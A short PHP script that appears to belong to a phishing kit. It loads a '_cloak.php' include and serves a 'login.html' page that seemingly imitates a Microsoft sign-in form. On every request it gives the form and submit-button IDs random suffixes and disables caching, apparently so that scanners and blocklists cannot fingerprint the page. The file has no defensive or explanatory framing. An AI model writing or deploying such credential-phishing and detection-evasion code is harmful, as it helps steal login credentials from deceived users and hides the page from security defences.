<?php
require_once __DIR__ . '/../_cloak.php';

// Serve the page with dynamic cache-busting
$html = file_get_contents('login.html');
$suffix = substr(md5(time() . rand()), 0, 8);
$html = str_replace('id="ms-form"', 'id="ms-form-' . $suffix . '"', $html);
$html = str_replace('id="submit-btn"', 'id="btn-' . $suffix . '"', $html);

header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');
header('Content-Type: text/html; charset=utf-8');
echo $html;
?>